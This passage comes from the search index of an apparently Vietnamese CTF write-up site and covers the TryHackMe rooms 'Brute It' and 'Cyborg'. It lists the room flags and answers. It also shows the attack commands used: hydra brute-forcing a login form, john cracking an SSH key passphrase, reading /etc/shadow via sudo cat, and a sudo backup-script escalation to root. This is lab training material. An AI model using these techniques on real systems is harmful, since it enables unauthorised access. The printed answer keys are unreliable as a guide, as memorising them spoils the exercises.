\u1ea3nh \u0111\u00e3 \u0111\u01b0\u1ee3c \u1ea9n t\u1ec7p password trong \u0111\u00f3 (d\u00f9ng stegseek), v\u00e0 \u0111i theo \u0111\u01b0\u1eddng leo thang \u0111\u1eb7c quy\u1ec1n nano. Alt text","title":"H\u01b0\u1edbng ti\u1ebfp c\u1eadn"},{"location":"tryhackme/room/bruteit/","tags":["THM-Room","Privilege Escalation"],"text":"Brute It \u00b6 Room at https://tryhackme.com/room/bruteit List of the questions solved Question: How many ports are open? Ans: 2 Question: What version of SSH is running Ans: OpenSSH 7.6p1 Question: What version of Apache is running? Ans: Ubuntu Question: What is the hidden directory? Ans: /admin Question: What is the user:password of the admin panel? Ans: admin:xavier Question: What is John's RSA private Key passphrase Ans: rockinroll Question: user.txt Ans: THM{a_password_is_not_a_barrier} Question: Web flag Ans: THM{brut3_f0rce_is_e4sy} Question: What is the root password? football Question: root.txt Ans: THM{pr1v1l3g3_3sc4l4t10n} Pentest scenario \u00b6 Host: 10.10.206.216 Reconnaissance \u00b6 Nh\u01b0 th\u01b0\u1eddng l\u1ec7, ta c\u0169ng scan nmap (ch\u1ecdn option -A \u0111\u1ec3 hi\u1ec3n th\u1ecb th\u00f4ng tin c\u1ea7n thi\u1ebft \u0111\u1ec3 tr\u1ea3 l\u1eddi c\u00e2u h\u1ecfi), gobuster Scan nmap ra \u0111\u01b0\u1ee3c 2 port: 22 cho ssh v\u00e0 80 cho http Sau khi scan ra url http://10.10.206.216/admin , ta \u0111\u01b0\u1ee3c hint quan tr\u1ecdng nh\u01b0 h\u00ecnh d\u01b0\u1edbi V\u1edbi h\u00ecnh tr\u00ean, ta bi\u1ebft \u0111\u01b0\u1ee3c s\u1ebd c\u00f3 user john (d\u00f9ng cho ssh) v\u00e0 trang web login l\u1ea5y username l\u00e0 admin :3 Ro\u00e0i, d\u00f9ng hydra \u0111\u1ec3 bruteforce password cho username admin th\u00f4i hydra -l admin -P ~/Desktop/allthings/rockyou.txt 10.10.206.216 http-post-form \"/admin/index.php:user=admin&pass= PASS :Username or password invalid\" No.......... username: admin password: xavier Sau khi login th\u00e0nh c\u00f4ng, ta \u0111\u01b0\u1ee3c th\u00eam file pass cho ssh v\u00e0 Web flag D\u00f9ng john ta c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng t\u00ecm \u0111\u01b0\u1ee3c passphrase Terminal \u2514\u2500 $ sudo ssh2john id_rsa > hash sudo john hash - -wordlist =/ usr / share / wordlists / rockyou . txt Using default input encoding : UTF - 8 Loaded 1 password hash ( SSH , SSH private key [ RSA / DSA / EC / OPENSSH 32 / 64 ]) Cost 1 ( KDF / cipher [ 0 = MD5 / AES 1 = MD5 / 3DES 2 = Bcrypt / AES ]) is 0 for all loaded hashes Cost 2 ( iteration count ) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort , almost any other key for status rockinroll ( id_rsa ) 1g 0 : 00 : 00 : 06 DONE ( 2023 - 09 - 01 14 : 41 ) 0 . 1512g / s 10984p / s 10984c / s 10984C / s saloni .. rock14 Use the \"--show\" option to display all of the cracked passwords reliably Session completed . Xem n\u00f3 V\u00ec file id_rsa l\u00e0 file private key cho ssh n\u00ean d\u00f9ng john id_rsa th\u00ec john kh\u00f4ng hi\u1ec3u \u0111\u01b0\u1ee3c file id_rsa, n\u00ean s\u1ebd d\u1eabn \u0111\u1ec3n vi\u1ec7c kh\u00f4ng t\u00ecm \u0111\u01b0\u1ee3c key passphrase. Ta c\u1ea7n chuy\u1ec3n file id_rsa th\u00e0nh d\u1ea1ng hash m\u00e0 john c\u00f3 th\u1ec3 hi\u1ec3u. \u0110\u00f3 l\u00e0 l\u00fd do ta d\u00f9ng ssh2john . C\u00f3 \u0111\u1ee7 m\u1ecdi th\u1ee9 r\u1ed3i, login ssh th\u00f4i Init Access \u00b6 Sudo -l B\u00e0i n\u00e0y leo quy\u1ec1n d\u1ec5 ro\u00e0i, v\u00ec c\u00f3 quy\u1ec1n sudo t\u1ea1i l\u1ec7nh cat. Ta s\u1ebd d\u00f9ng n\u00f3 \u0111\u1ec3 \u0111\u1ecdc file /etc/shadow. /etc/shadow Sau khi gi\u1ea3i m\u00e3 password, ta \u0111\u01b0\u1ee3c Root's password: football Privilege Escalation \u00b6 Leo quy\u1ec1n th\u00f4i Terminal su root What we learned \u00b6 Privilege Escalation with /bin/cat Use tool ssh2john","title":"Brute It"},{"location":"tryhackme/room/bruteit/#brute-it","text":"Room at https://tryhackme.com/room/bruteit List of the questions solved Question: How many ports are open? Ans: 2 Question: What version of SSH is running Ans: OpenSSH 7.6p1 Question: What version of Apache is running? Ans: Ubuntu Question: What is the hidden directory? Ans: /admin Question: What is the user:password of the admin panel? Ans: admin:xavier Question: What is John's RSA private Key passphrase Ans: rockinroll Question: user.txt Ans: THM{a_password_is_not_a_barrier} Question: Web flag Ans: THM{brut3_f0rce_is_e4sy} Question: What is the root password? football Question: root.txt Ans: THM{pr1v1l3g3_3sc4l4t10n}","title":"Brute It"},{"location":"tryhackme/room/bruteit/#pentest-scenario","text":"Host: 10.10.206.216","title":"Pentest scenario"},{"location":"tryhackme/room/bruteit/#reconnaissance","text":"Nh\u01b0 th\u01b0\u1eddng l\u1ec7, ta c\u0169ng scan nmap (ch\u1ecdn option -A \u0111\u1ec3 hi\u1ec3n th\u1ecb th\u00f4ng tin c\u1ea7n thi\u1ebft \u0111\u1ec3 tr\u1ea3 l\u1eddi c\u00e2u h\u1ecfi), gobuster Scan nmap ra \u0111\u01b0\u1ee3c 2 port: 22 cho ssh v\u00e0 80 cho http Sau khi scan ra url http://10.10.206.216/admin , ta \u0111\u01b0\u1ee3c hint quan tr\u1ecdng nh\u01b0 h\u00ecnh d\u01b0\u1edbi V\u1edbi h\u00ecnh tr\u00ean, ta bi\u1ebft \u0111\u01b0\u1ee3c s\u1ebd c\u00f3 user john (d\u00f9ng cho ssh) v\u00e0 trang web login l\u1ea5y username l\u00e0 admin :3 Ro\u00e0i, d\u00f9ng hydra \u0111\u1ec3 bruteforce password cho username admin th\u00f4i hydra -l admin -P ~/Desktop/allthings/rockyou.txt 10.10.206.216 http-post-form \"/admin/index.php:user=admin&pass= PASS :Username or password invalid\" No.......... username: admin password: xavier Sau khi login th\u00e0nh c\u00f4ng, ta \u0111\u01b0\u1ee3c th\u00eam file pass cho ssh v\u00e0 Web flag D\u00f9ng john ta c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng t\u00ecm \u0111\u01b0\u1ee3c passphrase Terminal \u2514\u2500 $ sudo ssh2john id_rsa > hash sudo john hash - -wordlist =/ usr / share / wordlists / rockyou . txt Using default input encoding : UTF - 8 Loaded 1 password hash ( SSH , SSH private key [ RSA / DSA / EC / OPENSSH 32 / 64 ]) Cost 1 ( KDF / cipher [ 0 = MD5 / AES 1 = MD5 / 3DES 2 = Bcrypt / AES ]) is 0 for all loaded hashes Cost 2 ( iteration count ) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort , almost any other key for status rockinroll ( id_rsa ) 1g 0 : 00 : 00 : 06 DONE ( 2023 - 09 - 01 14 : 41 ) 0 . 1512g / s 10984p / s 10984c / s 10984C / s saloni .. rock14 Use the \"--show\" option to display all of the cracked passwords reliably Session completed . Xem n\u00f3 V\u00ec file id_rsa l\u00e0 file private key cho ssh n\u00ean d\u00f9ng john id_rsa th\u00ec john kh\u00f4ng hi\u1ec3u \u0111\u01b0\u1ee3c file id_rsa, n\u00ean s\u1ebd d\u1eabn \u0111\u1ec3n vi\u1ec7c kh\u00f4ng t\u00ecm \u0111\u01b0\u1ee3c key passphrase. Ta c\u1ea7n chuy\u1ec3n file id_rsa th\u00e0nh d\u1ea1ng hash m\u00e0 john c\u00f3 th\u1ec3 hi\u1ec3u. \u0110\u00f3 l\u00e0 l\u00fd do ta d\u00f9ng ssh2john . C\u00f3 \u0111\u1ee7 m\u1ecdi th\u1ee9 r\u1ed3i, login ssh th\u00f4i","title":"Reconnaissance"},{"location":"tryhackme/room/bruteit/#init-access","text":"Sudo -l B\u00e0i n\u00e0y leo quy\u1ec1n d\u1ec5 ro\u00e0i, v\u00ec c\u00f3 quy\u1ec1n sudo t\u1ea1i l\u1ec7nh cat. Ta s\u1ebd d\u00f9ng n\u00f3 \u0111\u1ec3 \u0111\u1ecdc file /etc/shadow. /etc/shadow Sau khi gi\u1ea3i m\u00e3 password, ta \u0111\u01b0\u1ee3c Root's password: football","title":"Init Access"},{"location":"tryhackme/room/bruteit/#privilege-escalation","text":"Leo quy\u1ec1n th\u00f4i Terminal su root","title":"Privilege Escalation"},{"location":"tryhackme/room/bruteit/#what-we-learned","text":"Privilege Escalation with /bin/cat Use tool ssh2john","title":"What we learned"},{"location":"tryhackme/room/cyborgt8/","tags":["THM-Room","Privilege Escalation"],"text":"Cyborg \u00b6 Room at https://tryhackme.com/room/cyborgt8 List of the questions solved Question: Scan the machine, how many ports are open? 2 Question: What service is running on port 22? ssh Question: What service is running on port 80? http Question: What is the user.txt flag? flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3} Question: What is the root.txt flag? flag{Than5s_f0r_play1ng_H0p\u00a3_y0u_enJ053d} Pentest scenario \u00b6 Reconnaissance \u00b6 \u0110\u1ea7u ti\u00ean ta qu\u00e9t namp, gobuster nh\u01b0 c\u00e1c challenge kh\u00e1c Nmap PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http Gobuster / admin ( Status : 301 ) [ Size : 310 ] [--> http :// 10 . 10 . 28 . 65 / admin /] / etc ( Status : 301 ) [ Size : 308 ] [--> http :// 10 . 10 . 28 . 65 / etc /] Sau khi ki\u1ec3m tra v\u00e0i b\u01b0\u1edbc ban \u0111\u1ea7u ta th\u1ea5y c\u00f3 file password t\u1eeb folder /etc Password \u0110\u1ec3 xem password n\u00e0y ta c\u00f3 th\u1ec3 d\u00f9ng john \u0111\u1ec3 gi\u1ea3i m\u00e3 Password \u2514\u2500 $ john - -show pass . txt music_archive : squidward 1 password hash cracked , 0 left H\u01a1n n\u1eefa trong domain .../admin ta th\u1ea5y c\u00f3 th\u1ec3 download t\u1ec7p archive.tar. Download n\u00f3 v\u1ec1 th\u00f4i :3 C\u00e1i kh\u00f3 c\u1ee7a b\u00e0i n\u00e0y l\u00e0 \u0111\u1ecdc blog https://borgbackup.readthedocs.io (th\u00f4ng tin t\u1eeb file README) v\u00e0 c\u00e0i \u0111\u1eb7t borg borg extract --list final_archive::music_archive Terminal \u2514\u2500 $ borg extract - -list final_archive :: music_archive Enter passphrase for key / home / kali / Desktop / something / tryhackme / practice / cyborgt8 / home / field / dev / final_archive : home / alex home / alex /. bashrc home / alex /. bash_logout home / alex /. profile home / alex / Music home / alex /. bash_history home / alex /. dbus home / alex /. dbus / session-bus home / alex /. dbus / session-bus / c707f46991feb1ed17e415e15fe9cdae - 0 home / alex /. config home / alex /. config / sublime-text - 3 home / alex /. config / sublime-text - 3 / Cache home / alex /. config / sublime-text - 3 / Cache / ActionScript home / alex /. config / sublime-text - 3 / Cache / ActionScript / ActionScript . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / AppleScript home / alex /. config / sublime-text - 3 / Cache / AppleScript / AppleScript . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ASP home / alex /. config / sublime-text - 3 / Cache / ASP / ASP . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ASP / HTML-ASP . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Batch File home / alex /. config / sublime-text - 3 / Cache / Batch File / Batch File . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / C # home / alex /. config / sublime-text - 3 / Cache / C #/Build.sublime-syntax.cache home / alex /. config / sublime-text - 3 / Cache / C #/C#.sublime-syntax.cache home / alex /. config / sublime-text - 3 / Cache / C ++ home / alex /. config / sublime-text - 3 / Cache / C ++/ C . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / C ++/ C ++. sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Clojure home / alex /. config / sublime-text - 3 / Cache / Clojure / Clojure . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / CSS home / alex /. config / sublime-text - 3 / Cache / CSS / CSS . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / D home / alex /. config / sublime-text - 3 / Cache / D / D . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / D / DMD Output . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Diff home / alex /. config / sublime-text - 3 / Cache / Diff / Diff . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Erlang home / alex /. config / sublime-text - 3 / Cache / Erlang / Erlang . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Erlang / HTML ( Erlang ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Attributes . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Commit . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Common . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Config . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Ignore . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Link . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Log . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Rebase . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Go home / alex /. config / sublime-text - 3 / Cache / Go / Go . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Graphviz home / alex /. config / sublime-text - 3 / Cache / Graphviz / DOT . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Groovy home / alex /. config / sublime-text - 3 / Cache / Groovy / Groovy . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Haskell home / alex /. config / sublime-text - 3 / Cache / Haskell / Haskell . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Haskell / Literate Haskell . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / HTML home / alex /. config / sublime-text - 3 / Cache / HTML / HTML . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java home / alex /. config / sublime-text - 3 / Cache / Java / Java . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java / Java Server Pages ( JSP ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java / JavaDoc . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java / JavaProperties . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / JavaScript home / alex /. config / sublime-text - 3 / Cache / JavaScript / JavaScript . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / JavaScript / JSON . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / JavaScript / Regular Expressions ( JavaScript ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX home / alex /. config / sublime-text - 3 / Cache / LaTeX / Bibtex . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX / LaTeX . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX / LaTeX Log . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX / TeX . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Lisp home / alex /. config / sublime-text - 3 / Cache / Lisp / Lisp . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Lua home / alex /. config / sublime-text - 3 / Cache / Lua / Lua . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Makefile home / alex /. config / sublime-text - 3 / Cache / Makefile / Make Output . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Makefile / Makefile . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Markdown home / alex /. config / sublime-text - 3 / Cache / Markdown / Markdown . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Markdown / MultiMarkdown . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Matlab home / alex /. config / sublime-text - 3 / Cache / Matlab / Matlab . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Objective-C home / alex /. config / sublime-text - 3 / Cache / Objective-C / Objective-C . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Objective-C / Objective-C ++. sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml home / alex /. config / sublime-text - 3 / Cache / OCaml / camlp4 . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml / OCaml . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml / OCamllex . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml / OCamlyacc . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Pascal home / alex /. config / sublime-text - 3 / Cache / Pascal / Pascal . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Perl home / alex /. config / sublime-text - 3 / Cache / Perl / Perl . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / PHP home / alex /. config / sublime-text - 3 / Cache / PHP / PHP . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / PHP / PHP Source . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / PHP / Regular Expressions ( PHP ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Python home / alex /. config / sublime-text - 3 / Cache / Python / Python . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Python / Regular Expressions ( Python ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / R home / alex /. config / sublime-text - 3 / Cache / R / R . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / R / R Console . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / R / Rd ( R Documentation ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails home / alex /. config / sublime-text - 3 / Cache / Rails / HTML ( Rails ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / JavaScript ( Rails ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / Ruby Haml . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / Ruby on Rails . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / SQL ( Rails ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Regular Expressions home / alex /. config / sublime-text - 3 / Cache / Regular Expressions / RegExp . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / RestructuredText home / alex /. config / sublime-text - 3 / Cache / RestructuredText / reStructuredText . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Ruby home / alex /. config / sublime-text - 3 / Cache / Ruby / Ruby . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rust home / alex /. config / sublime-text - 3 / Cache / Rust / Cargo . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rust / Rust . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Scala home / alex /. config / sublime-text - 3 / Cache / Scala / Scala . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ShellScript home / alex /. config / sublime-text - 3 / Cache / ShellScript / Bash . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ShellScript / commands-builtin-shell-bash . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ShellScript / Shell-Unix-Generic . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / SQL home / alex /. config / sublime-text - 3 / Cache / SQL / SQL . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / TCL home / alex /. config / sublime-text - 3 / Cache / TCL / HTML ( Tcl ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / TCL / Tcl . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Text home / alex /. config / sublime-text - 3 / Cache / Text / Plain text . tmLanguage . cache home / alex /. config / sublime-text - 3 / Cache / Text / Plain text . tmLanguage . rcache home / alex /. config / sublime-text - 3 / Cache / Textile home / alex /. config / sublime-text - 3 / Cache / Textile / Textile . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / XML home / alex /. config / sublime-text - 3 / Cache / XML / XML . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / YAML home / alex /. config / sublime-text - 3 / Cache / YAML / YAML . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Default home / alex /. config / sublime-text - 3 / Cache / Default / Syntax Summary . cache home / alex /. config / sublime-text - 3 / Cache / Default / Meta Info Summary . cache home / alex /. config / sublime-text - 3 / Cache / Default / Startup . cache home / alex /. config / sublime-text - 3 / Packages home / alex /. config / sublime-text - 3 / Packages / User home / alex /. config / sublime-text - 3 / Local home / alex /. config / sublime-text - 3 / Local / Auto Save Session . sublime_session home / alex /. config / sublime-text - 3 / Lib home / alex /. config / sublime-text - 3 / Lib / python3 . 3 home / alex /. config / sublime-text - 3 / Installed Packages home / alex /. config / ibus home / alex /. config / ibus / bus home / alex / Documents home / alex / Documents / note . txt home / alex / Public home / alex / Videos home / alex / Desktop home / alex / Desktop / secret . txt home / alex / Downloads home / alex / Templates home / alex / Pictures T\u1eeb d\u1eef li\u1ec7u tr\u00ean, ta l\u1ea5y \u0111\u01b0\u1ee3c username v\u00e0 password login ssh th\u00f4ng qua file note.txt c\u00f3 trong d\u1eef li\u1ec7u Terminal \u2514\u2500 $ cat home / alex / Documents / note . txt Wow I 'm awful at remembering Passwords so I' ve taken my Friends advice and noting them down ! alex : S3cretP @s3 Init Access \u00b6 Privilege Escalation \u00b6 B\u00e0i n\u00e0y leo quy\u1ec1n kh\u00e1 \u0111\u01a1n gi\u1ea3n alex @ubuntu :/ etc / mp3backups $ sudo -l Matching Defaults entries for alex on ubuntu : env_reset , mail_badpass , secure_path =/ usr / local / sbin \\:/ usr / local / bin \\:/ usr / sbin \\:/ usr / bin \\:/ sbin \\:/ bin \\:/ snap / bin User alex may run the following commands on ubuntu : ( ALL : ALL ) NOPASSWD : / etc / mp3backups / backup . sh sudo -l cho ta th\u1ea5y user alex c\u00f3 quy\u1ec1n sudo tr\u00ean file backup, nh\u01b0ng quan tr\u1ecdng h\u01a1n alex l\u1ea1i l\u00e0 ng\u01b0\u1eddi t\u1ea1o file \u0111\u00f3 :3 C\u1ea5p quy\u1ec1n write Do v\u1eady ta c\u1ea5p quy\u1ec1n ghi v\u00e0o file v\u00e0 th\u00eam /bin/bash \u0111\u1ec3 ch\u1ea1y quy\u1ec1n root. Ta s\u1ebd leo quy\u1ec1n th\u00e0nh c\u00f4ng. Full flag What we learned \u00b6 Borg backup: https://borgbackup.readthedocs.io/en/stable/usage/extract.html?highlight=extract#borg-extract","title":"Cyborg"},{"location":"tryhackme/room/cyborgt8/#cyborg","text":"Room at https://tryhackme.com/room/cyborgt8 List of the questions solved Question: Scan the machine, how many ports are open? 2 Question: What service is running on port 22? ssh Question: What service is running on port 80? http Question: What is the user.txt flag? flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3} Question: What is the root.txt flag? flag{Than5s_f0r_play1ng_H0p\u00a3_y0u_enJ053d}","title":"Cyborg"},{"location":"tryhackme/room/cyborgt8/#pentest-scenario","text":"","title":"Pentest scenario"},{"location":"tryhackme/room/cyborgt8/#reconnaissance","text":"\u0110\u1ea7u ti\u00ean ta qu\u00e9t namp, gobuster nh\u01b0 c\u00e1c challenge kh\u00e1c Nmap PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http Gobuster / admin ( Status : 301 ) [ Size : 310 ] [--> http :// 10 . 10 . 28 . 65 / admin /] / etc ( Status : 301 ) [ Size : 308 ] [--> http :// 10 . 10 . 28 . 65 / etc /] Sau khi ki\u1ec3m tra v\u00e0i b\u01b0\u1edbc ban \u0111\u1ea7u ta th\u1ea5y c\u00f3 file password t\u1eeb folder /etc Password \u0110\u1ec3 xem password n\u00e0y ta c\u00f3 th\u1ec3 d\u00f9ng john \u0111\u1ec3 gi\u1ea3i m\u00e3 Password \u2514\u2500 $ john - -show pass . txt music_archive : squidward 1 password hash cracked , 0 left H\u01a1n n\u1eefa trong domain .../admin ta th\u1ea5y c\u00f3 th\u1ec3 download t\u1ec7p archive.tar. Download n\u00f3 v\u1ec1 th\u00f4i :3 C\u00e1i kh\u00f3 c\u1ee7a b\u00e0i n\u00e0y l\u00e0 \u0111\u1ecdc blog https://borgbackup.readthedocs.io (th\u00f4ng tin t\u1eeb file README) v\u00e0 c\u00e0i \u0111\u1eb7t borg borg extract --list final_archive::music_archive Terminal \u2514\u2500 $ borg extract - -list final_archive :: music_archive Enter passphrase for key / home / kali / Desktop / something / tryhackme / practice / cyborgt8 / home / field / dev / final_archive : home / alex home / alex /. bashrc home / alex /. bash_logout home / alex /. profile home / alex / Music home / alex /. bash_history home / alex /. dbus home / alex /. dbus / session-bus home / alex /. dbus / session-bus / c707f46991feb1ed17e415e15fe9cdae - 0 home / alex /. config home / alex /. config / sublime-text - 3 home / alex /. config / sublime-text - 3 / Cache home / alex /. config / sublime-text - 3 / Cache / ActionScript home / alex /. config / sublime-text - 3 / Cache / ActionScript / ActionScript . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / AppleScript home / alex /. config / sublime-text - 3 / Cache / AppleScript / AppleScript . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ASP home / alex /. config / sublime-text - 3 / Cache / ASP / ASP . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ASP / HTML-ASP . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Batch File home / alex /. config / sublime-text - 3 / Cache / Batch File / Batch File . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / C # home / alex /. config / sublime-text - 3 / Cache / C #/Build.sublime-syntax.cache home / alex /. config / sublime-text - 3 / Cache / C #/C#.sublime-syntax.cache home / alex /. config / sublime-text - 3 / Cache / C ++ home / alex /. config / sublime-text - 3 / Cache / C ++/ C . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / C ++/ C ++. sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Clojure home / alex /. config / sublime-text - 3 / Cache / Clojure / Clojure . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / CSS home / alex /. config / sublime-text - 3 / Cache / CSS / CSS . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / D home / alex /. config / sublime-text - 3 / Cache / D / D . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / D / DMD Output . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Diff home / alex /. config / sublime-text - 3 / Cache / Diff / Diff . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Erlang home / alex /. config / sublime-text - 3 / Cache / Erlang / Erlang . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Erlang / HTML ( Erlang ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Attributes . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Commit . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Common . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Config . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Ignore . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Link . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Log . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Git Formats / Git Rebase . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Go home / alex /. config / sublime-text - 3 / Cache / Go / Go . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Graphviz home / alex /. config / sublime-text - 3 / Cache / Graphviz / DOT . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Groovy home / alex /. config / sublime-text - 3 / Cache / Groovy / Groovy . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Haskell home / alex /. config / sublime-text - 3 / Cache / Haskell / Haskell . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Haskell / Literate Haskell . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / HTML home / alex /. config / sublime-text - 3 / Cache / HTML / HTML . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java home / alex /. config / sublime-text - 3 / Cache / Java / Java . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java / Java Server Pages ( JSP ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java / JavaDoc . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Java / JavaProperties . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / JavaScript home / alex /. config / sublime-text - 3 / Cache / JavaScript / JavaScript . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / JavaScript / JSON . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / JavaScript / Regular Expressions ( JavaScript ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX home / alex /. config / sublime-text - 3 / Cache / LaTeX / Bibtex . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX / LaTeX . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX / LaTeX Log . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / LaTeX / TeX . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / 